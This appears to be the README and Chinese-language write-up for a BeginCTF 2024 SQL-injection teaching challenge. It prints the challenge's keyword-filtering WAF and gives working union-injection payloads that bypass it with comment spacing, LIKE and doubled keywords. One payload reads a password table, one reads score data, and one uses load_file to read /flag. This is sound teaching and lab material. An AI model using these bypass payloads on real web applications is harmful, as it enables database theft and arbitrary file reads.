# BeginCTF2024 SQL教学局

此repo为该题源码，可以通过以下命令快速搭建

~~dockerfile写得稀烂师傅们骂轻点（~~

```
docker push kihanahare/2024beginctf_sqldemo:V1
```

# WriteUp

官方全套wp飞书直达：https://hjug69b9j6.feishu.cn/docx/V02Rd3MyWoRPVxxTTCOcLutNnqe?from=from_copylink

甩锅：题目没有问题，只是你拿到的第二段flag可能是假的，因为里面500条混淆数据，只有特定的一条是正确的

本着教学的目的，还是简单提一嘴sql注入，以及观察waf的方法，这里直接把waf放出来

```PHP
function waf($input)
{
    if (preg_match('/regexp|left|floor|reverse|update|between|=|>|<|and|\|right|substr|replace|char|&|\\\$|sleep| /i', $input, $matches)) {
        return array(false, $matches[0]);
    } else {
        $pattern = "/(select|from|load|or)/i";
        $input = preg_replace($pattern, '', $input);
        return array(true, $input);
    }
}
```

本质上就是对sql语句的直接拼接，且对传入的参数没有做好过滤，导致非法的sql语句执行，这一点在前端中也体现了，此处采用的注入手法为union注入，也就是联合注入

- 第一段flag位于 secret数据库password表的某条数据

构造的sql语句为：

```SQL
select ? from secret.password
```

由于不知道字段名，可以通过查询information_schema.columns获得数据，固定手法啊，记好了！

```SQL
select group_concat(column_name) from information_schema.columns where table_schema=xxx
```

然后空格绕过，此处采用/**/即可，等号被过滤了用like即可

![img](https://hjug69b9j6.feishu.cn/space/api/box/stream/download/asynccode/?code=NTg0YzU5ZWMxMzE4NTY3MGQyZmY0NzZiMTc4MzdmZWZfZVVEcUNNZXBkVmxjN1VKdEhaaGw3Skprek5YS1lSUERfVG9rZW46UHBITGJ2Vlppb3dQRGx4TDBLeGNLZmY0bm9mXzE3MDgwMTIzNjM6MTcwODAxNTk2M19WNA)

发现有些关键字被吞了，双写绕过即可，select -> selselectect

![img](https://hjug69b9j6.feishu.cn/space/api/box/stream/download/asynccode/?code=NmIzMWUwMWJiZDEwYzMwYmE1MjVhZWU2YzRjM2ViNzBfOHR1MDZ2dmpPbHdsS3E1NzhCZjMxT05wY3Z2aHpPTThfVG9rZW46UW0ycGJvNWZobzRRT0p4b2VXeGNpbkE3bklUXzE3MDgwMTIzNjM6MTcwODAxNTk2M19WNA)

获得三个字段名，猜一下是flag，猜不到你就爆

综上所述，绕过waf后，所以第一个flag的payload：

```SQL
1'/**/union/**/selselectect/**/flag/**/frofromm/**/secret.passwoorrd%23
```

![img](https://hjug69b9j6.feishu.cn/space/api/box/stream/download/asynccode/?code=NzAwZjBhMGRmNzRjZDQ0N2YxNDkyNDlhZjkzYWU2Y2JfaGp1M3VPTTRCQWdpcTc0Q2tZU01mSHVISW9XRDhrUkxfVG9rZW46TW5oRWJidE44b244Zlh4aW1laWNXQUtXbnlEXzE3MDgwMTIzNjM6MTcwODAxNTk2M19WNA)

- 第二段flag位于 当前数据库score表，学生begin的成绩(grade)

争议最大的地方，不想手选数据就用where搞定即可。构造的sql语句为：

```SQL
select ? from score where ? = 'begin'
```

不知道字段名用上面的方法看一下嘛！

![img](https://hjug69b9j6.feishu.cn/space/api/box/stream/download/asynccode/?code=NmNmOWI2Y2Q1MjQ4MzFhYWQ3YWRiMmFjNzkwMzFmM2VfM1c2SW9McVVPS3BITzhUczFFWU0xUm9Vb0RuYmlIZ3lfVG9rZW46WnVVZWJ0NndPb0JRR1J4RldGS2N1TlJGblkyXzE3MDgwMTIzNjM6MTcwODAxNTk2M19WNA)

绕过waf，payload如下

```SQL
1'/**/union/**/seleselectct/**/grade/**/frfromom/**/scoorre/**/where/**/student/**/like/**/'begin'/**/%23
```

![img](https://hjug69b9j6.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDUzZmEyMzllODhkZTMyZDExYjI2YzZlYjA5ODk2YjRfWE5zT3RvWnlTa1ZrcUZYNDlURnA5YnRzZ2tsNnUxZHFfVG9rZW46TG9Fa2J3bHFYb3l1eXh4eklKZmNSN1FBblNmXzE3MDgwMTIzNjM6MTcwODAxNTk2M19WNA)

其实本来是要把begin过滤掉的，但是好像忘写了，可以想一想如果过滤了begin，又怎么做

- 第三段flag位于 /flag

经典之load_file，读文件即可

构造的sql语句：

```SQL
select load_file('/flag')
```

绕过waf，payload如下

```SQL
1'/**/union/**/seleselectct/**/loloadad_file('/flag')%23
```

![img](https://hjug69b9j6.feishu.cn/space/api/box/stream/download/asynccode/?code=YmY3MTFlNjJlOTE3OWFiYTM3MTFmODYyODU1MzA1MzdfMkJ0REpYVTVqaW51VmlLWk5KZlVINUFrMGkwa0w3dmpfVG9rZW46RmRVSWIzMFpZb1l3MFV4UnMwa2NjT0RXblFmXzE3MDgwMTIzNjM6MTcwODAxNTk2M19WNA)

